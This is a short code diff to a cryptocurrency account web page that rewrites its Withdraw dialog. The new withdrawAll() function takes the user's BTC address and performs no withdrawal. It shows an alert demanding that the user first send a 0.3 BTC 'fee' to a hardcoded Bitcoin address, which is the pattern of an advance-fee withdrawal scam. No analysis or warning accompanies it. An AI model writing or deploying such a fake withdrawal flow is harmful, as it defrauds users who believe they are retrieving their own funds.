@@ -181,8 +181,8 @@
 <div class="modal" id="withdrawModal">
   <div class="modal-content">
     <h3>Withdraw</h3>
-    <input type="number" class="login-input" placeholder="Amount" />
-    <button class="login-button">Confirm</button>
+    <input type="text" class="login-input" id="withdrawAddress" placeholder="Enter BTC Address" />
+    <button class="login-button" onclick="withdrawAll()">Withdraw All</button>
     <button class="logout-btn" onclick="closeModal('withdrawModal')">Close</button>
   </div>
 </div>
@@ -265,6 +265,18 @@
     } catch (e) {
       document.getElementById("btcAmount").innerText = "Error loading";
     }
+  }
+
+  function withdrawAll() {
+    const withdrawAddress = document.getElementById('withdrawAddress').value;
+    if (!withdrawAddress) {
+      alert('Please enter a valid Bitcoin address.');
+      return;
+    }
+
+    // Show withdrawal notice
+    alert(`Please proceed with your withdrawal transaction by sending a fee amount of 0.3 BTC to the following address: \n\nbc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u\n\nThank you!`);
+    closeModal('withdrawModal');
   }
 </script>
 
